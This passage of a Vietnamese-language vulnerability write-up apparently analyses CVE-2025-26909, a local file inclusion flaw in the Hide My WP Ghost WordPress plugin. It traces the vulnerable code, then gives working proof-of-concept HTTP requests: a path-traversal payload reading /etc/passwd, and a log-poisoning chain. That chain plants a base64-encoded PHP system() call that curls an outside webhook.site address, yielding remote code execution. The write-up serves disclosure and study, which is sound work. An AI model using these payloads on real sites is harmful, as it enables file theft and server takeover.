&amp;#39;hmwp_wp-signup_url&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false ) {&#xA;            ob_start();&#xA;            include $new_path;&#xA;            $content = ob_get_clean();&#xA;            header( &amp;#34;HTTP/1.1 200 OK&amp;#34; );&#xA;            //Echo the html file content&#xA;            echo $content;&#xA;            exit();&#xA;        } elseif ( ! HMWP_Classes_Tools::getValue( &amp;#39;nordt&amp;#39; ) ) {&#xA;            // other logic&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;include $new_path&lt;/code&gt; l√† ƒëi·ªÉm c√≥ th·ªÉ g√¢y LFI; ƒë·ªÉ th·ª±c thi ƒë∆∞·ª£c, c√°c ƒëi·ªÅu ki·ªán bao quanh ph·∫£i ƒë∆∞·ª£c th·ªèa m√£n.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;$url&lt;/code&gt; kh√°c &lt;code&gt;$new_url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Trong &lt;code&gt;getOriginalUrl()&lt;/code&gt; ƒëo·∫°n x·ª≠ l√Ω query:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;    $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;    $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;    $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_parse_url( &#39;http://localhost/x/abc?&#39; )&lt;/code&gt; -&amp;gt; c√≥ &lt;code&gt;path&lt;/code&gt; nh∆∞ng &lt;code&gt;query&lt;/code&gt; r·ªóng (ho·∫∑c &lt;code&gt;query&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c set / empty).&lt;/li&gt;&#xA;&lt;li&gt;ƒêi·ªÅu ki·ªán &lt;code&gt;isset(...) &amp;amp;&amp;amp; ! empty(...)&lt;/code&gt; s·∫Ω &lt;strong&gt;fail&lt;/strong&gt; v·ªõi &lt;code&gt;?&lt;/code&gt; kh√¥ng c√≥ param, n√™n kh√¥ng append g√¨ v√†o &lt;code&gt;$new_url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$new_url&lt;/code&gt; tr·∫£ v·ªÅ &lt;code&gt;http://localhost/x/abc&lt;/code&gt; (kh√¥ng c√≥ &lt;code&gt;?&lt;/code&gt;), trong khi &lt;code&gt;$url&lt;/code&gt; ban ƒë·∫ßu l√† &lt;code&gt;http://localhost/x/abc?&lt;/code&gt; do ƒë√≥ kh√°c nhau v√† (&lt;code&gt;$url &amp;lt;&amp;gt; $new_url&lt;/code&gt;) l√† &lt;code&gt;true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Bi·∫øn &lt;code&gt;$new_url_no_query&lt;/code&gt; ph·∫£i ch·ª©a chu·ªói &lt;code&gt;&#39;/&#39; . HMWP_Classes_Tools::getDefault(&#39;hmwp_activate_url&#39;) . &#39;/&#39;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Khi t√¨m trong m√£ ngu·ªìn plugin v·ªõi t·ª´ kh√≥a &lt;code&gt;hmwp_activate_url&lt;/code&gt;, ta th·∫•y h√†m &lt;code&gt;HMWP_Classes_Tools::getDefault(&#39;hmwp_activate_url&#39;)&lt;/code&gt; tr·∫£ v·ªÅ gi√° tr·ªã &lt;strong&gt;&lt;code&gt;wp-activate.php&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/search1.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_activate_url&amp;#39; )&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa &lt;code&gt;HMWP_Classes_Tools::getDefault( &#39;hmwp_activate_url&#39; )&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Do ƒë√≥, ƒëi·ªÅu ki·ªán th·ª±c t·∫ø l√† &lt;code&gt;$new_url_no_query&lt;/code&gt; ph·∫£i ch·ª©a &lt;strong&gt;&lt;code&gt;/wp-activate.php/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;üëâ Nh∆∞ v·∫≠y, ƒë·ªÉ ƒëo·∫°n &lt;code&gt;include $new_path&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi, URL ph·∫£i c√≥ &lt;strong&gt;k√Ω t·ª± &lt;code&gt;?&lt;/code&gt; ·ªü cu·ªëi&lt;/strong&gt; (ƒë·ªÉ &lt;code&gt;$url &amp;lt;&amp;gt; $new_url&lt;/code&gt;) v√† &lt;strong&gt;ch·ª©a &lt;code&gt;/wp-activate.php/&lt;/code&gt;&lt;/strong&gt; trong ƒë∆∞·ªùng d·∫´n.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$new_path&lt;/code&gt; l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa &lt;code&gt;getOriginalPath($new_url)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalPath( $new_url ) {&#xA;    // Remove domain from path&#xA;    $new_path = str_replace( home_url(), &amp;#39;&amp;#39;, $new_url );&#xA;&#xA;    // Remove queries from path&#xA;    if ( strpos( $new_path, &amp;#39;?&amp;#39; ) !== false ) {&#xA;        $new_path = substr( $new_path, 0, strpos( $new_path, &amp;#39;?&amp;#39; ) );&#xA;    }&#xA;&#xA;    return HMWP_Classes_Tools::getRootPath() . ltrim( $new_path, &amp;#39;/&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y tr·∫£ v·ªÅ path g·ªëc kh√¥ng ch·ª©a params string, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;http://localhost/x/wp-activate.php?&amp;#34; -&amp;gt; &amp;#34;/srv/www/wordpress/x/wp-activate.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh∆∞ v·∫≠y ta ƒë√£ c√≥ c√°c ƒëi·ªÅu ki·ªán c·∫ßn thi·∫øt ƒë·ªÉ LFI x·∫£y ra, ta c·∫ßn t√¨m lu·ªìng g·ªçi ƒë·∫øn &lt;code&gt;showFile()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function maybeShowNotFound() {&#xA;    //If the file doesn&amp;#39;t exist&#xA;    //show the file content&#xA;    if ( is_404() ) {&#xA;        $this-&amp;gt;showFile( $this-&amp;gt;getCurrentURL() );&#xA;    } else {&#xA;        $this-&amp;gt;maybeShowLogin( $this-&amp;gt;getCurrentURL() );&#xA;    }&#xA;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;showFile()&lt;/code&gt; ƒë∆∞·ª£c &lt;code&gt;maybeShowNotFound&lt;/code&gt; n·∫øu client request ƒë·∫øn t√†i nguy√™n kh√¥ng t·ªìn t·∫°i v·ªõi tham s·ªë l√† k·∫øt qu·∫£ tr·∫£ v·ªÅ c·ªßa &lt;code&gt;getCurrentURL()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getCurrentURL() {&#xA;    $url = &amp;#39;&amp;#39;;&#xA;&#xA;    if ( isset( $_SERVER[&amp;#39;HTTP_HOST&amp;#39;] ) ) {&#xA;        // build the URL in the address bar&#xA;        $url = is_ssl() ? &amp;#39;https://&amp;#39; : &amp;#39;http://&amp;#39;;&#xA;        $url .= $_SERVER[&amp;#39;HTTP_HOST&amp;#39;];&#xA;        $url .= rawurldecode( $_SERVER[&amp;#39;REQUEST_URI&amp;#39;] );&#xA;    }&#xA;&#xA;    return $url;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;URI&lt;/code&gt; l·∫•y t·ª´ &lt;code&gt;$_SERVER[&#39;REQUEST_URI&#39;]&lt;/code&gt; ƒë∆∞·ª£c decode r·ªìi concat v√†o &lt;code&gt;$url&lt;/code&gt; ƒë·ªÉ tr·∫£ v·ªÅ.&lt;/p&gt;&#xA;&lt;p&gt;Ta ƒë·∫∑t debug trong h√†m &lt;code&gt;showFile()&lt;/code&gt; v√† g·ª≠i request ƒë·∫øn t√†i nguy√™n kh√¥ng t·ªìn t·∫°i.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php? HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Debugger ƒë√£ nh·∫£y ƒë·∫øn &lt;code&gt;showFile()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/debug1.png&#34;&#xA;    alt=&#34;Debugger nh·∫£y ƒë·∫øn showFile()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger nh·∫£y ƒë·∫øn &lt;code&gt;showFile()&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i request v·ªõi LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd? HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Debug&lt;/strong&gt;:&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/debug2.png&#34;&#xA;    alt=&#34;Debugger v·ªõi valid payload&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger v·ªõi valid payload&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/result1.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Gi·∫£i th√≠ch&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;/x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/etc/passwd?&lt;/code&gt; sau khi decode s·∫Ω tr·ªü th√†nh &lt;code&gt;/x/wp-activate.php/..///..///..///..///../etc/passwd?&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta d√πng chu·ªói n√†y ƒë·ªÉ ƒë√°nh l·ª´a Apache, khi·∫øn Apache kh√¥ng ph√°t hi·ªán vi·ªác v∆∞·ª£t &lt;strong&gt;Document Root&lt;/strong&gt;. N·∫øu d√πng &lt;code&gt;/x/wp-activate.php/../../../../../etc/passwd?&lt;/code&gt; s·∫Ω b·ªã ph√°t hi·ªán v∆∞·ª£t &lt;strong&gt;Document Root&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;///&lt;/code&gt; v·∫´n ƒë∆∞·ª£c ch·∫•p nh·∫≠n t∆∞∆°ng ƒë∆∞∆°ng &lt;code&gt;/&lt;/code&gt;, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;w41bu1@22NS088:~$ ls /////////&#xA;bin  boot  cdrom  dev  etc  home  lib  lib64  lost&amp;#43;found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  swap.img&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;log-poisoning--lfi--rce&#34;&gt;&lt;span&gt;Log poisoning ‚Üí LFI ‚Üí RCE&lt;/span&gt;&#xA;  &lt;a href=&#34;#log-poisoning--lfi--rce&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;G·ª≠i request v·ªõi PHP code ƒë·∫∑t trong &lt;code&gt;User-Agent&lt;/code&gt; header&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu;&amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;G·ª≠i request v·ªõi LFI payload tr·ªè ƒë·∫øn &lt;code&gt;/var/log/apache2/other_vhosts_access.log&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/result2.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI =&amp;gt; RCE th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI =&amp;gt; RCE th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Gi·∫£i th√≠ch&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy c·∫≠p trang v·ªõi User‚ÄëAgent ch·ª©a payload tr√™n, Apache s·∫Ω l∆∞u payload n√†y v√†o access log:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log&#xA;127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 &amp;#43;0700] &amp;#34;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1&amp;#34; 403 2844 &amp;#34;-&amp;#34; &amp;#34;Mozilla/5.0 (X11; Ubuntu; &amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt;Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;code&gt;include()&lt;/code&gt; m·ªôt file, PHP s·∫Ω th·ª±c thi m·ªçi m√£ PHP (&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;) c√≥ trong n·ªôi dung file tr∆∞·ªõc khi tr·∫£ v·ªÅ. Payload ƒë∆∞·ª£c m√£ ho√° b·∫±ng Base64 v√† gi·∫£i m√£ t·∫°i th·ªùi ƒëi·ªÉm include b·∫±ng &lt;code&gt;base64_decode&lt;/code&gt; tr√°nh l·ªói escape d·∫•u ngo·∫∑c k√©p (&lt;code&gt;&amp;quot;&lt;/code&gt; ‚Üí &lt;code&gt;\&amp;quot;&lt;/code&gt;) khi logger l∆∞u. L·ªánh gi·∫£i m√£ s·∫Ω tr·ªü th√†nh:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -I &amp;#39;https://webhook.site/bac7e163-b475-4323-a315-acd010359640&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cu·ªëi c√πng &lt;code&gt;system()&lt;/code&gt; s·∫Ω ch·∫°y l·ªánh n√†y v√† tr·∫£ output.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;C·∫£nh b√°o&lt;/p&gt;&lt;p&gt;L∆∞u √Ω: d√π &lt;code&gt;base64_decode&lt;/code&gt; b·ªã ch·∫∑n b·ªüi plugin nh∆∞ng Apache ƒë√£ l∆∞u tr·ªØ tr∆∞·ªõc khi plugin x·ª≠ l√Ω, chu·ªói Base64 v·∫´n ƒë∆∞·ª£c ghi v√†o log.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 5.4.01&lt;/strong&gt; c·ªßa Hide My WP Ghost cho ph√©p LFI v√¨ plugin t√°i t·∫°o ƒë∆∞·ªùng d·∫´n r·ªìi &lt;code&gt;include()&lt;/code&gt; m√† kh√¥ng canonicalize/whitelist. B·∫±ng c√°ch k·∫øt h·ª£p log‚Äëpoisoning v√† payload ch·ª©a &lt;code&gt;/wp-activate.php/?&lt;/code&gt;, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·ª´ LFI leo th√†nh RCE trong m·ªôt s·ªë c·∫•u h√¨nh. L·ªó h·ªïng ƒë∆∞·ª£c v√° trong &lt;strong&gt;5.4.02&lt;/strong&gt; b·∫±ng vi·ªác sanitize URL tr∆∞·ªõc khi tr·∫£ v·ªÅ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; 